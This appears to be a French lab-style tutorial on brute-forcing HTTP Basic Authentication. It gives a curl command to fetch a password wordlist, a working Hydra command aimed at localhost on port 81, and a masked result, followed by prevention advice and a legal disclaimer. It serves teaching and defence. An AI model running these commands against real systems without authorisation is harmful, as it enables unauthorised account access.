🔐 Login Brute Force (Basic Auth)

🎯 Définition

Une attaque par brute-force consiste à tester un grand nombre de combinaisons de mots de passe afin de compromettre un compte. Dans le cas du Basic HTTP Authentication, cela revient à tester automatiquement des credentials jusqu’à trouver le bon.

⚠️ Impact

  • Accès non autorisé à des comptes
  • Compromission de données sensibles
  • Escalade de privilèges

🧠 Pourquoi c’est vulnérable

Le Basic Auth envoie les identifiants encodés en Base64 dans chaque requête HTTP. Sans protection supplémentaire (rate limiting, captcha, etc.), il devient très facile de lancer une attaque brute-force.

🔍 Fonctionnement du Basic Auth

  • Le serveur répond avec 401 Unauthorized
  • Le navigateur demande un login/mot de passe
  • Les credentials sont encodés en Base64
  • Envoyés dans le header Authorization
Authorization: Basic YWxpY2U6c2VjcmV0MTIz

🛠️ Outil : Hydra

Hydra est un outil permettant d’automatiser les attaques brute-force sur différents services (HTTP, SSH, FTP, etc.).

🚀 Exploitation avec Hydra

1. Télécharger une wordlist

curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/.../2023-200_most_used_passwords.txt

2. Lancer l’attaque

hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81

3. Explication

  • -l : username connu
  • -P : liste de mots de passe
  • 127.0.0.1 : cible
  • http-get / : attaque via HTTP GET
  • -s 81 : port

🧪 Résultat

[http-get] host: 127.0.0.1   login: basic-auth-user   password: ******

✅ Hydra trouve automatiquement le bon mot de passe en testant toute la wordlist.

🛡️ Prévention

  • Limiter le nombre de tentatives (rate limiting)
  • Utiliser un CAPTCHA
  • Activer l’authentification multi-facteurs (MFA)
  • Utiliser HTTPS
  • Logs et détection d’anomalies
⚠️ Ce contenu est strictement pédagogique. Toute utilisation doit être faite dans un cadre légal et autorisé.
